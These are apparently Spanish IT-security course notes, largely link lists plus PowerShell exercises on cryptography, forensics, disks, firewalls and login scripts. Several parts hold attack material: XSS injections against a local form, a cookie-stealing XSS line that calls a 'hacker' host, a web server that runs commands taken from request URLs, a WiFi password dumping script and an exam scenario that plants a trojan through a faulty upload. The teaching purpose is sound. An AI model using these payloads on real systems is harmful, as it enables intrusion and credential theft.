https://www.jesusninoc.com/2017/11/10/encrypts-content-by-using-the-cryptographic-message-syntax-format/
**Decrypts content that has been encrypted by using the Cryptographic Message Syntax format**
https://www.jesusninoc.com/2017/11/12/decrypts-content-that-has-been-encrypted-by-using-the-cryptographic-message-syntax-format/
**Exports a certificate to a Personal Information Exchange (PFX) file**
https://www.jesusninoc.com/2017/11/18/exports-a-certificate-to-a-personal-information-exchange-pfx-file/
**Imports certificates and private keys from a Personal Information Exchange (PFX) file to the destination store**
https://www.jesusninoc.com/2017/11/20/imports-certificates-and-private-keys-from-a-personal-information-exchange-pfx-file-to-the-destination-store/

**EXPORTS A CERTIFICATE TO A PERSONAL INFORMATION EXCHANGE (PFX) FILE**

* https://www.jesusninoc.com/11/18/exports-a-certificate-to-a-personal-information-exchange-pfx-file/

**Aclarar concepto (firmar vs cifrar)**

* https://www.jesusninoc.com/02/12/firmar-y-verificar-archivos-java-archive-jar-con-jarsigner/
* https://www.jesusninoc.com/02/11/ejercicios-de-seguridad-realizar-una-comunicacion-udp-segura-utilizando-cryptographic-message-syntax/
* https://www.jesusninoc.com/02/11/ejercicios-de-seguridad-realizar-una-comunicacion-tcp-segura-utilizando-cryptographic-message-syntax/

**Certificados**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-26.md

### Establecimiento de políticas de contraseñas.

**Hacer un login y comprobar que una página web está disponible**

* https://github.com/jesusninoc/ExamenSAD11-12-2019/blob/master/ExamenSAD11-12-2019

**Obtener el password de un usuario**

```PowerShell
New-LocalUser usuario6 -Password (ConvertTo-SecureString (Get-Random (1..100000)) -asplaintext -force)
```

**Fuerza**

* https://github.com/jesusninoc/Seguridad/tree/master/GetPost
* https://github.com/jesusninoc/Seguridad/tree/master/FuerzaBruta

**Fuerza bruta y ofuscación**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-20.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-21.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-02-25.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-01-11.md
* https://github.com/CBHue/PyFuscation

**Enviar una contraseña utilizando un servidor web**

* https://www.jesusninoc.com/02/11/hacking-wifi-with-powershell/

**Password cracker**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-08.md
- https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/converting-securestring-to-text
- https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/testing-password-strength

### Políticas de almacenamiento. Medios de almacenamiento externo: DAS (Direct Attached Storage), NAS (Network Attached Storage), SAN (Storage Area Network). Copias de seguridad e imágenes de respaldo.


## Análisis forense en sistemas informáticos.

**Análisis forense**
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-03-05.md#an%C3%A1lisis-forense
- https://www.jesusninoc.com/02/28/seguridad-informatica-con-powershell/#Forense

**Internet Explorer versions and their cache location RRS feed**
* https://social.technet.microsoft.com/Forums/en-US/878e79ff-6c50-42aa-b273-c08008dac4cc/internet-explorer-versions-and-their-cache-location?forum=winserver8gen

**Dumping All Passwords from Chrome**
* https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/dumping-all-passwords-from-chrome

**Dumping Personal Passwords from Windows**
* https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/dumping-personal-passwords-from-windows

**CREAR UN FICHERO DE VOLCADO DE MEMORIA DE UN PROCESO Y BUSCAR UNA CADENA**
* https://www.jesusninoc.com/09/12/crear-un-fichero-de-volcado-de-memoria-de-un-proceso-y-buscar-una-cadena/

**Más sobre volcado de memoria**
* https://www.google.com/search?q=jesusninoc+volcar+memoria

**USO DE ADB**

https://www.jesusninoc.com/2016/10/30/abrir-whatsapp-mediante-adb-a-traves-de-powershell/

**Realizar varias búsquedas con Google Chrome en Android leyendo de un fichero y pulsar en un enlace mediante un script en la shell de Android con ADB**
https://www.jesusninoc.com/2016/04/10/realizar-varias-busquedas-con-google-chrome-en-android-leyendo-de-un-fichero-y-pulsar-en-un-enlace-mediante-adb-a-traves-de-powershell/

**Análisis forense**

**Registry Ripper**
* https://github.com/keydet89/RegRipper2.8
**f3e (Firefox 3 Extractor)**
**Data Carving**
* https://www.computerhope.com/jargon/d/data-carving.htm
* https://www.jesusninoc.com/02/03/leer-el-contenido-de-un-fichero-y-representarlo-en-hexadecimal/
* https://www.jesusninoc.com/04/22/leer-el-contenido-de-un-fichero-bmp-en-ascii-y-representarlo-en-hexadecimal/
* https://www.jesusninoc.com/06/15/leer-el-contenido-de-un-fichero-que-contiene-bits/
**Thumbnail Database Viewer**
* http://www.itsamples.com/thumbnail-database-viewer.html

**Análisis forense**

* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-02-07.md

**Metadatos**

* https://www.jesusninoc.com/01/01/extraer-coordenadas-gps-de-imagenes-con-powershell/

# Implantación de mecanismos de seguridad activa

## Ataques y contramedidas en sistemas personales:

**Caso: ¿Me están espiando?**

* https://www.jesusninoc.com/me-estan-espiando/

**Obtener el código de la web https://github.com/jesusninoc/Seguridad/tree/master/GetPost**

$web = iwr "http://localhost/seguridad/GetPost/"
$web | Get-Member -MemberType Properties
$web.Links | %{
    if($_.outerText -match ".php")
    {
        $_.outerText
    }
}
```

**Ejemplo: comprobar en los enlaces de un sitio web si se encuentra algún fichero PHP y realizar una petición al formulario de forma automática buscando "<b onmouseover=alert('Wufff!')>click me!</b>"**
```PowerShell
$web = iwr "http://localhost/seguridad/GetPost/"
$web.Links | %{
    if($_.outerText -match ".php")
    {
        $_.outerText
        $web2 = iwr ("http://localhost/seguridad/GetPost/"+$_.outerText)
        $url = "http://localhost/Seguridad/GetPost/"+$web2.Forms.action
        $web2.Forms.fields.nombre="<b onmouseover=alert('Wufff!')>click me!</b>"
        $web2.Forms.fields.edad=43
        Invoke-RestMethod -Uri $url -Method get -Body $web2.Forms.fields | Select-String "alert"
    }
}
```

**Ejemplo: realizar una petición al formulario de forma automática buscando "<b onmouseover=alert('Wufff!')>click me!</b>" (solución 1, distinto resultado de etiquetas)**
```PowerShell
$web = iwr "http://localhost/Seguridad/GetPost/postindex.php"
$url = "http://localhost/Seguridad/GetPost/"+$web.Forms.action
$web.Forms.fields.nombre="<b onmouseover=alert('Wufff!')>click me!</b>"
$web.Forms.fields.edad=43
Invoke-RestMethod -Uri $url -Method Post -Body $web.Forms.fields
```

**Ejemplo: realizar una petición al formulario de forma automática buscando "<b onmouseover=alert('Wufff!')>click me!</b>" (solución 2, distinto resultado de etiquetas)**
```PowerShell
$webget = iwr "http://localhost/seguridad/GetPost/exampleget.php?nombre=%3Cb%20onmouseover=alert(%27Wufff!%27)%3Eclick%20me!%3C/b%3E&edad=3&submit=Enviar"
$webget.Content
```

**Comentar libro**

**Clase de hoy**

* https://jesusninoc.github.io/ClasesSAD/2019-11-22.html

**create the session**

$options = New-CimSessionOption -Protocol Wsman
$session = New-CimSession -ComputerName sr0710 -SessionOption $options

### Clasificación de los ataques y amenazas.


### Control de acceso al sistema. Seguridad en BIOS (Basic Input-Output System). Seguridad en gestores arranque.

- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-10-23.md#actualizar-bios
- https://wiki.archlinux.org/index.php/Fstab_(Espa%C3%B1ol
- https://www.dell.com/support/article/es/es/esbsdt1/sln284985/c%C3%B3mo-realizar-una-restauraci%C3%B3n-de-bios-o-cmos-o-borrar-el-nvram-en-el-sistema-dell?lang=es

### Consideraciones de seguridad en el particionado de discos.

**Tareas sobre discos**

- Analizar información sobre el almacenamiento en Windows
https://www.jesusninoc.com/2017/07/04/4-gestion-del-sistema-de-archivos-en-powershell/
- Analizar información sobre el almacenamiento en Linux
https://github.com/jesusninoc/ClasesSOM/blob/master/2018-04-09.md
- Crear una partición en Windows
```PowerShell
New-Partition -DiskNumber 1 -UseMaximumSize -AssignDriveLetter
```
- Crear un disco virtual en Windows
```MS-DOS
DiskPart
create vdisk file="C:\vdisks\disk1.vhd" maximum=160
attach vdisk
(select vdisk)
create partition primary
assign letter=g
format
```
- Crear un disco virtual en Windows con PowerShell, particionar, montar y dar formato
```PowerShell
$vhdpath = "C:\VHDs\Test.vhdx"
$vhdsize = 1GB
New-VHD -Path $vhdpath -Dynamic -SizeBytes $vhdsize | Mount-VHD -Passthru |Initialize-Disk -Passthru | New-Partition -AssignDriveLetter -UseMaximumSize |Format-Volume -FileSystem NTFS -Confirm:$false -Force
```
- Cifrar un disco en Windows con PowerShell
```PowerShell
Enable-BitLocker -MountPoint "f:" -RecoveryPasswordProtector -UsedSpaceOnly -Verbose
```
- Crear un disco virtual en Linux, particionar y dar formato
```Bash
dmesg | grep "sd"
sudo blkid
df -h
sudo fdisk -l /dev/sdb
sudo fdisk /dev/sdb
sudo mkfs.ext4 /dev/sdb
sudo mkdir mount_name
sudo mount -t auto -v /dev/sdb mount_name
```
- Desmontar discos en Linux
https://www.jesusninoc.com/2017/04/17/ejemplos-uso-mount-y-umount-en-linux/
- Analizar USB
https://github.com/jesusninoc/PowerShell/blob/master/Seguridad/Detectar%20si%20hay%20un%20dispositivo%20USB%20conectado%20y%20copiar%20el%20contenido%20en%20una%20carpeta%20temporal.ps1

### Autenticación para el acceso al sistema (cuentas, contraseñas, tarjetas inteligentes, lectores de huellas…).

**Utilizar un OCR**

* https://www.jesusninoc.com/01/06/resolver-el-captcha-de-amazon/
* https://www.amazon.es/errors/validateCaptcha
* https://github.com/UB-Mannheim/tesseract/wiki
* https://github.com/tesseract-ocr/tesseract/wiki

**CAPTCHA**

* https://www.jesusninoc.com/01/06/resolver-el-captcha-de-amazon/
* https://www.jesusninoc.com/01/05/descargar-la-imagen-del-captcha-de-amazon/
* https://www.jesusninoc.com/02/09/aclarar-una-imagen-utilizando-imagemagick-y-convertir-a-texto-con-tesseract/

### Seguridad en sistemas de ficheros. Acceso a recursos. Listas de control de acceso.

- https://www.jesusninoc.com/01/19/programacion-de-permisos/
- https://www.jesusninoc.com/02/21/permisos-en-linux/
- https://www.jesusninoc.com/06/09/crear-un-recurso-compartido-y-asignar-permisos-al-recurso/
- https://www.jesusninoc.com/08/19/anadir-permiso-ntfs-a-una-carpeta/
- https://www.jesusninoc.com/12/08/analizar-permisos-de-un-apk/

### Actualización de sistemas y aplicaciones. Autenticidad de aplicaciones y actualizaciones.


### Anatomía de ataques y análisis de software malicioso (malware: virus, gusanos, spyware, keylogers…).

**Android**

* https://github.com/CellularPrivacy/Android-IMSI-Catcher-Detector

- https://github.com/jesusninoc/ClasesSAD/blob/master/2019-10-09.md#powershell
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2017/2017-09-26.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-01.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-03.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-07.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-08.md
- https://isc.sans.edu/diary/Malspam+with+Word+docs+uses+macro+to+run+Powershell+script+and+steal+system+data/24564
- https://www.blackhat.com/asia-19/briefings/schedule/#investigating-malware-using-memory-forensics---a-practical-approach-14413
- https://www.jesusninoc.com/01/10/curso-de-hacking-con-powershell/
- https://www.jesusninoc.com/02/28/seguridad-informatica-con-powershell/#Introduccion
- https://www.jesusninoc.com/04/11/detectar-si-hay-un-apk-infectado-en-android/
- https://www.jesusninoc.com/07/05/5-gestion-del-software-en-powershell/#Actualizaciones
- https://www.jesusninoc.com/07/09/9-gestion-de-la-red-en-powershell/
- https://www.jesusninoc.com/10/09/windows-post-exploitation-cmdlets-execution-powershell/
- https://www.jesusninoc.com/11/16/10-gestion-del-rendimiento-en-powershell-para-administradores-de-sistemas/#Copias_de_seguridad
- https://www.jesusninoc.com/contrasenas-seguras-con-powershell/

### Seguridad en la conexión con redes públicas.

**TOR**

* https://www.jesusninoc.com/02/01/crear-un-dominio-onion/
* https://www.redteamsecure.com/evil-svg-project/
* https://www.hacklooking.cl/2019/01/13/kali-linux-tor-desde-tu-navegador-y-sin-instalar-nada/
- https://github.com/beahunt3r/Windows-Hunting/tree/master/Persistence/Registry%20Autoruns
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-09.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-13.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-11-19.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-12-04.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018/2018-12-05.md
- https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019/2019-01-21.md
- https://github.com/jesusninoc/diccionario-espanol-txt

**Conexión con TOR y TCP/UDP**
* https://www.jesusninoc.com/02/01/crear-un-dominio-onion/
* https://www.jesusninoc.com/11/10/realizar-conexiones-tcp-udp-con-powershell/

**Comienzo del script:**

Start-Sleep -Milliseconds 200
$opcion= Read-Host "Introduzca un valor"
If ($opcion -eq "1"){
**Escriba el hash**
        Write-Host "Introduzca el código hash" -ForegroundColor Yellow
        $hash= Read-Host "Introduzca un valor"
           #Para probar el script podemos usar el siguiente hash: "ba4038fd20e474c047be8aad5bfacdb1bfc1ddbe12f803f473b7918d8d819436"
**Introducimos el hash en la función**
    $VTresultado = submit-VTHash($hash)
**RESULTADOS**
        Write-Host -ForegroundColor Cyan "Resource    : " -NoNewline; Write-Host $VTresultado.resource
        Write-Host -ForegroundColor Cyan "Scan date   : " -NoNewline; Write-Host $VTresultado.scan_date
        Write-Host -ForegroundColor Cyan "Positives   : " -NoNewline; Write-Host $VTresultado.positives
        Write-Host -ForegroundColor Cyan "Total Scans : " -NoNewline; Write-Host $VTresultado.total
        Write-Host -ForegroundColor Cyan "Permalink   : " -NoNewline; Write-Host $VTresultado.permalink
    }
    Else{
If ($opcion -eq "2"){
**Archivo**
        Write-Host "Introduzca la ubicación de la carpeta del archivo (C:\Users\Administrador) sin la barra del final" -ForegroundColor Yellow
        $ubicacion= Read-Host "Introduzca la ruta del archivo"
         Write-Host "Introduzca del archivo (Archivo.txt)" -ForegroundColor Yellow
         $ruta= Read-Host "Introduzca el nombre del archivo"
            $archivo= "$ubicacion\$ruta"
            $hash= Get-FileHash -LiteralPath $archivo -Algorithm SHA256
            $hash= ($hash.Hash).ToLower()
**Introducimos el hash en la función**
    $VTresultado = submit-VTHash($hash)
**RESULTADOS**
        Write-Host -ForegroundColor Cyan "Fuente                : " -NoNewline; Write-Host $VTresultado.resource
        Write-Host -ForegroundColor Cyan "Fecha del análisis    : " -NoNewline; Write-Host $VTresultado.scan_date
        Write-Host -ForegroundColor Cyan "Errores encontrados   : " -NoNewline; Write-Host $VTresultado.positives
        Write-Host -ForegroundColor Cyan "Análisis totales      : " -NoNewline; Write-Host $VTresultado.total
        Write-Host -ForegroundColor Cyan "Link del análisis     : " -NoNewline; Write-Host $VTresultado.permalink
        $virus= $VTresultado.positives
        if ($virus -gt 0){
            Write-Host -ForegroundColor Red "Se han detectado amenazas"
            Write-Host -ForegroundColor DarkRed "Ubicación de la amenaza  : " -NoNewline; Write-Host -ForegroundColor Gray "$archivo "
            }
        else{
            Write-Host -ForegroundColor Green "No hay riesgos"
            }
        }
        Else{

If ($opcion -eq "3"){
**Análisis de directorios y sus archivos**
        $dir= Read-Host "Introduzca la dirección del directorio a analizar"
**Obtenemos todos los archivos de la carpeta seleccionada con la función -Recurse y con -FullName obtenemos la ruta exacta de cada archivo de la carpeta**
        foreach($directorio in (Get-ChildItem -File -Force $dir -Recurse).FullName){
**Se obtiene el hash del archivo que se va a analizar. Si es un directorio saldrá un error del tipo NULL en la shell**
            $hash= Get-FileHash -LiteralPath $directorio -Algorithm SHA256
**Convertimos el hash a minúsculas**
            $hash= ($hash.Hash).ToLower()
**Introducimos el hash en la función**
            $VTresultado = submit-VTHash($hash)
**Extracción de resultados**
            Write-Host -ForegroundColor Cyan "Fuente                : " -NoNewline; Write-Host $VTresultado.resource
            Write-Host -ForegroundColor Cyan "Fecha del analáisis   : " -NoNewline; Write-Host $VTresultado.scan_date
            Write-Host -ForegroundColor Cyan "Errores encontrados   : " -NoNewline; Write-Host $VTresultado.positives
            Write-Host -ForegroundColor Cyan "Análisis totales      : " -NoNewline; Write-Host $VTresultado.total
            Write-Host -ForegroundColor Cyan "Link del análisis     : " -NoNewline; Write-Host $VTresultado.permalink
**Extraemos en la shell si hay virus o no, si hay virus, saldrá un texto en rojo mencionando que hay amenazas y nos proporcionará la ubicación del archivo infectado**
            $virus= $VTresultado.positives
            if ($virus -gt 0){
                Write-Host -ForegroundColor Red "Se han detectado amenazas"
                Write-Host -ForegroundColor DarkRed "Ubicación de la amenaza: " -NoNewline; Write-Host -ForegroundColor Gray "$directorio"
                }
            else{
                Write-Host -ForegroundColor Green "No hay riesgos"
               }
          }
     }
     Else{
If ($opcion -eq "4"){
**Script para recuperar contraseñas de WiFi en el ordenador**
**Obtenemos la información de las SSID a las que se ha conectado nuestro PC**
     $WifiSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
**Extraemos la contraseña almacenada en el PC mediante la funcion de key=clear | Select-String 'Key Content'**
      $WifiInfo = foreach($SSID in $WifiSSIDs) {
**Si el PC no está en inglés debemos sustituir el 'Contenido de la clave' por 'Key Content'**
        $Contraseña = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Contenido de la clave') -replace ".*:\s+"
        New-Object -TypeName psobject -Property @{"Contraseña"=$Contraseña;"SSID"=$SSID}
            }
**La opción "ConvertTo-Json" es opcional, podríamos poner un "ConvertTo-Html" para luego subirlo a una web, como no es el caso lo dejamos en "ConvertTo-Json"**
      $WifiInfo | ConvertTo-Json
      }
Else{
**Cualquier otro carácter introducido que no pertenezca a los declarados más arriba hará que se cancele la ejecución del script**
        Write-Host "No se analizará nada" -ForegroundColor Red
   }
  }
 }
}

**OMITIR LO SIGUIENTE, AÚN SE ENCUENTRA EN DESAROLLO**
"
**Para crear Logs:**
**Crear archivo de LOGS:**
        cd C:\DESCARGAS\Logs
        $dia= (date).DayOfYear
        $hora= (date).Hour
        $minuto= (date).Minute
            mkdir $dia -Force
            cd $dia
            'LOGS' > $hora~$minuto.txt
                Write-Host ' '
                Write-Host 'Análisis de directorios y sus archivos' -ForegroundColor Cyan
**Al final de cada codigo añadimos: >> $hora~$minuto.txt**
        "
```

**Ideas**

* https://github.com/GonzaloMB/ASIR2/blob/master/Virus2.0
* https://github.com/MikeRuSe/Scripts/blob/master/2020_02_07-Posible_virus.ps1
* https://github.com/Sergio-Armenteros/Virus--prueba/blob/master/Virus-camara
* https://github.com/Mariodiaz1998/ScriptLibreMario/blob/master/Script
* https://github.com/xuspino/carpetas-aleatorias-e-infinitas/blob/master/carpetas%20infonitas
* https://github.com/chrisnikpir/Andel/blob/master/Virus
* https://github.com/AAJeremias/Powershell/blob/master/Get-Screenshot
* https://github.com/aaronsor/Prueba/blob/master/prueba

**TOR**

* https://www.jesusninoc.com/02/01/crear-un-dominio-onion/
* https://www.hacklooking.cl/2019/01/13/kali-linux-tor-desde-tu-navegador-y-sin-instalar-nada/

### Pautas y prácticas seguras.

**Soluciones a ejercicios mezclando CIDAN**

* https://github.com/AlexRivero14/SAD/blob/master/2020-09-21.md
* https://github.com/DanielCebrian2/SAD/blob/master/2020-09-23%20cidan.md

**Ejercicios propuestos:**

- Conexión entre dispositivos SSH

**Incorporar seguridad al código de CIDAN**

* https://github.com/jesusninoc/ClasesSAD/blob/master/2020-09-23.md#soluciones-a-ejercicios-mezclando-cidan
**Ideas:**
- Controlar lo que escribe el usuario
- Que la contraseña cumple los requisitos de seguridad
- Que no se vea la contraseña

**Ejercicios**

**Generar hashes SHA512 de las palabras de un diccionario**
* https://www.jesusninoc.com/02/17/ejercicios-de-seguridad-generar-hashes-sha512-de-las-palabras-de-un-diccionario/

**Realizar login con PowerShell**
**Login con usuario y password que introduce el usuario**
* https://www.jesusninoc.com/02/17/ejercicios-de-seguridad-login-con-usuario-y-contrasena-que-introduce-el-usuario/

**El usuario y el password están almacenados en dos ficheros**
* https://www.jesusninoc.com/02/17/ejercicios-de-seguridad-hacer-un-login-en-el-que-el-usuario-y-el-password-estan-almacenados-en-dos-ficheros/

**El usuario y el password están almacenados en el mismo fichero**
* https://www.jesusninoc.com/02/17/ejercicios-de-seguridad-hacer-un-login-en-el-que-el-usuario-y-el-password-estan-almacenados-en-el-mismo-fichero/

**El password está almacenado en SHA512 en un fichero y el nombre del usuario también está almacenado**
* https://www.jesusninoc.com/02/17/ejercicios-de-seguridad-hacer-un-login-en-el-que-el-password-esta-almacenado-en-sha512-en-un-fichero-y-el-nombre-del-usuario-tambien-esta-almacenado/

**Ejercicios propuestos**

**Realizar login con PowerShell**
**El login se hace con la doble autenticación**
**Almacenar los intentos de login que sean correctos e incorrectos**

**Repaso**

- Garantizar la integridad
    - https://www.jesusninoc.com/get-filehash/
    - https://www.jesusninoc.com/02/28/seguridad-informatica-con-powershell/#Integridad
- Garantizar la confidencialidad
    - https://www.jesusninoc.com/02/28/seguridad-informatica-con-powershell/#Confidencialidad
    - https://www.jesusninoc.com/02/28/seguridad-informatica-con-powershell/#Criptografia
- Riesgos
    - https://github.com/jesusninoc/ClasesSeguridad/blob/master/2017/2017-10-04.md

**Repaso examen**

**Examen noviembre**

**Crear un escenario web donde exista un WordPress que tenga un fichero upload.php que falle y permita subir ficheros .ps1**
- WordPress creado por comandos https://github.com/jesusninoc/ClasesIAW/blob/master/2020-10-30.md#crear-un-script-que-instale-wordpress-mediante-la-l%C3%ADnea-de-comandos-wp-cli
- Upload permite subir ficheros .ps1 https://github.com/jesusninoc/ClasesIAW/blob/master/2020-11-06.md
- El fichero .ps1 es un troyano https://www.jesusninoc.com/11/10/realizar-conexiones-tcp-udp-con-powershell/
- Ejecutar el troyano https://www.jesusninoc.com/11/15/formas-de-descargar-y-ejecutar-ficheros-desde-un-servidor-en-powershell/

**Repaso examen**

* https://github.com/jesusninoc/ClasesSAD/blob/master/2020-11-11.md#examen-noviembre
* https://github.com/jesusninoc/Seguridad/blob/master/Una%20aproximaci%C3%B3n%20a%20los%20virus%20en%20PowerShell.md

**Repaso semana anterior**

* Números de móvil
* https://github.com/jesusninoc/ClasesSAD/blob/master/2019-09-01.md#implantaci%C3%B3n-de-seguridad-perimetral

**Examen semana que viene**

* https://github.com/jesusninoc/ClasesSAD/blob/master/2020-12-02.md

**Examen de evaluación**

**Preguntas posibles para el examen de evaluación**

- Implantar CIDAN al proyecto de IAW
- Simular fallos de seguridad en el proyecto de IAW
- ¿Cómo controlar una denegación de servicio?
- Asegurar integridad y confidencialidad
- Asegurar integridad y disponibilidad
  - Hacer login en un sistema y comprobar que una web está disponible (https://github.com/jesusninoc/ExamenSAD11-12-2019/blob/master/ExamenSAD11-12-2019)
- Valoración de riesgos

**Exámenes para repasar**

* https://github.com/jesusninoc/ClasesSAD/blob/master/2019-12-04.md
* https://github.com/jesusninoc/ClasesSAD/blob/master/2019-12-13.md

**Corrección examen**

* https://github.com/jesusninoc/ClasesSAD/blob/master/2020-12-02.md

**Repaso de todo**

* https://github.com/jesusninoc/ClasesSAD/blob/master/2020-12-04.md#detectar-xss
* XSS -> "><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>

**Ejercicios**

**Ejecutar un comando remotamente mediante una petición GET**

**Servidor desde PowerShell**
* https://www.jesusninoc.com/2017/05/06/crear-un-servidor-web-al-que-se-pueda-acceder-desde-cualquier-parte-de-la-red-privada-con-powershell/

**Ejecutar un comando remotamente utilizando un servidor web creado en PowerShell**
```Powershell
$routes = @{
    "/" = { return '<html><body>Servidor web funcionando</body></html>' }
}

#Importante poner la IP de la red privada
$url = 'http://192.168.204.222:8027/'
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($url)
$listener.Start()

Write-Host "Funcionando $url..."

while ($listener.IsListening)
{
    $context = $listener.GetContext()
    $requestUrl = $context.Request.Url
    $response = $context.Response

    Write-Host ''
    Write-Host "Petición: $requestUrl"

    $localPath = $requestUrl.LocalPath
    $route = $routes.Get_Item($requestUrl.LocalPath)

    if ($route -eq $null)
    {
        $response.StatusCode = 404
    }
    else
    {

        $content = & $route
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
    }

    $response.Close()
    start-process ($context.Request.RawUrl -replace "/")
    $context.Request.RawUrl
    $responseStatus = $response.StatusCode
    Write-Host "Respuesta: $responseStatus"
}
```

**Analizar direcciones MAC**
* https://github.com/MaxAnderson95/MAC-Address-Lookup-Tool

**Examen de evaluación**

**Prácticas en el Firewall de Windows**

**Analizar información del log del firewall con PowerShell, mostrar el número de conexiones que se están bloqueando mediante una alerta**

**Ayuda**
* https://www.jesusninoc.com/logparser/

**Solución**
```PowerShell
$fwlog = “C:\Windows\system32\LogFiles\Firewall\pfirewall.log”
Select-String -Path $fwlog -Pattern “drop” | Measure-Object
```

**Ejercicios de Routerboard de MikroTik**

* https://www.jesusninoc.com/01/12/ejercicios-de-routerboard-de-mikrotik-conectarse-a-un-routerboard-de-mikrotik-crear-y-ejecutar-un-script/
* https://www.jesusninoc.com/01/18/ejercicios-de-routerboard-de-mikrotik-conectarse-a-un-routerboard-de-mikrotik-establecer-una-direccion-ip-en-el-dispositivo-y-crear-un-script-que-muestre-cinco-numeros/
* https://www.jesusninoc.com/01/24/ejercicios-de-routerboard-de-mikrotik-conectarse-a-un-routerboard-de-mikrotik-establecer-una-direccion-ip-en-el-dispositivo-y-capturar-trafico-con-la-herramienta-packet-sniffer/
* https://www.jesusninoc.com/01/22/ejercicios-de-routerboard-de-mikrotik-configurar-proxy-en-mikrotik/

**Ejercicios de Routerboard de MikroTik**

* https://www.jesusninoc.com/01/22/ejercicios-de-routerboard-de-mikrotik-configurar-proxy-en-mikrotik/

**Ejercicios de Routerboard de MikroTik**

* https://www.jesusninoc.com/01/23/ejercicios-de-routerboard-de-mikrotik-realizar-configuraciones-del-firewall-de-mikrotik-practica-1/
* https://www.jesusninoc.com/01/24/ejercicios-de-routerboard-de-mikrotik-realizar-configuraciones-del-firewall-de-mikrotik-practica-2/

**Ejercicios de Routerboard de MikroTik**

* https://www.jesusninoc.com/01/15/ejercicios-de-routerboard-de-mikrotik-permitir-y-bloquear-la-conexion-ssh-en-el-firewall-de-mikrotik/
* https://www.jesusninoc.com/01/24/ejercicios-de-routerboard-de-mikrotik-configurar-una-vpn/

**Examen**

* Simular un proxy analizando los datos que se transmiten desde PowerShell
  - https://www.jesusninoc.com/01/15/ejercicios-de-seguridad-simular-el-funcionamiento-de-un-proxy-cache-mediante-una-conexion-udp-entre-un-cliente-y-un-servidor-que-solicitan-una-imagen-y-si-la-imagen-ya-se-ha-descargado-se-indica-en-un/
* Simular un forwarding desde PowerShell
  - https://www.jesusninoc.com/02/03/enviar-un-fichero-por-udp-entre-un-cliente-y-un-servidor/
  - https://www.jesusninoc.com/10/07/crear-un-cliente-y-un-servidor-tcpip-con-powershell/
* Simular un proxy caché desde PowerShell
  - https://www.jesusninoc.com/01/15/ejercicios-de-seguridad-simular-el-funcionamiento-de-un-proxy-cache-mediante-una-conexion-udp-entre-un-cliente-y-un-servidor-que-solicitan-una-imagen-y-si-la-imagen-ya-se-ha-descargado-se-indica-en-un/
* Simular el funcionamiento de una VPN desde PowerShell
  - https://www.jesusninoc.com/01/24/ejercicios-de-seguridad-simular-el-funcionamiento-de-una-vpn-desde-powershell/

**Más prácticas**

- Cifrar una carpeta y ver qué pasa en varios sistemas operativos, los ficheros de la carpeta serán variados por ejemplo ficheros comprimidos
- Corregir un archivo mediante la herramienta de integridad SFC
- Instalar un rootkit y eliminarlo
- Conocer Nessus, Metasploit, Nmap.
- Virtualizar sistemas operativos orientados a la seguridad
- Instalar un servidor NAS
- Realizar copias de seguridad
- Script para realizar copias
- Recuperar datos en un disco mediante herramientas
- Sistemas biométricos
- Cámaras IP inalámbricas junto con detectores de MAC (airodump)
- Cain & Abel, pam_cracklib
- Distribuiones LIVE (UBCD, Backtrack, Ophcrack, Slax, Wifiway y Wifislax)
- Backtrack a disco duro
- Quitar contraseña BIOS (CLR_MOS, UBCD con cmos_pwd)
- Sacar SAM y crackear
- Quitar contraseña del Sistema operativo con UBCD y Password Renew)
- Sacar el userpasswords2 con SticyKeys en System32
- Sacar el shadow con John the Ripper
- Scripts acl's
- Instalar un Keylogger
- Utilizar un troyano, detectarlo, analizarlo
- Procedimiento para antivirus, con LIVE CD
- Subir virus a Virustotal
- Utilizar algoritmos de cifrado en sistema operativo, programarlos con JAVA
- Scripts de cifrado
- Cifrar con herramientas propias del sistema operativo u otras (TrueCypt)
- PGP
- Hash y tablas (Anonymouse)
- Certificados digitales (ssltrip)
- Man in the Mide - ARP spoofing - Pharming con Cain & Abel
- Sniffing - Analizar red (Wireshark)
- IDS probarlo (Snort)
- Analizar puertos
- SSH y otras comunicaciones seguras
- Telnet no seguro (sniffing)
- VPN segura
- Wifi y todo lo que se relaciona
- Montar un servidor Radius con freeradius
- Configurar cortafuegos con Kerio Winrout Firewall
- Analizar logs
- Configurar proxy
- Realizar un RAID
- Balancear carga con dos tarjetas de red en Linux
- Realizar una auditoría sobre la LOPD
- Realizar un volcado de memoria y analizarlo
- Aplicar fuerza bruta a un ASP y un PHP (Burp, Brutus)
- Analizar conversación con WhatsApp en una red Wifi
- Libro sobre seguridad obligatorio (Fraude, Forense, Registro)
- Web-DDos
- Recuperar contraseñas con Ophcrack (Rainbox Tables LM, MD5)
- Herramienta de control remoto
